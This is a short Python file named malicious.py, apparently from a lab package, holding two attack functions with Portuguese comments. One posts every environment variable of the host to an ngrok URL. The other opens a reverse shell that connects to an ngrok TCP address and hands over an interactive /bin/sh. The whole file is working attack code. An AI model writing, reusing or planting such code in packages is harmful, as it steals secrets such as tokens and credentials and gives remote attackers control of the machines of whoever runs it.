# artifact_lab_3_package_6e10193e/malicious.py
# import os
# import socket
# import subprocess
# import requests

def send_metadata():
    env_vars = os.environ
    url = "https://b889-67-205-141-215.ngrok-free.app/log"  # URL ngrok fornecida

    # Enviar as variáveis de ambiente para o servidor
    try:
        response = requests.post(url, data=env_vars)
        print(f"Server responded with status code: {response.status_code}")
    except Exception as e:
        print(f"Failed to send metadata: {e}")

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("8.tcp.ngrok.io", 14060))  # Substitua com o seu host e porta do ngrok
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])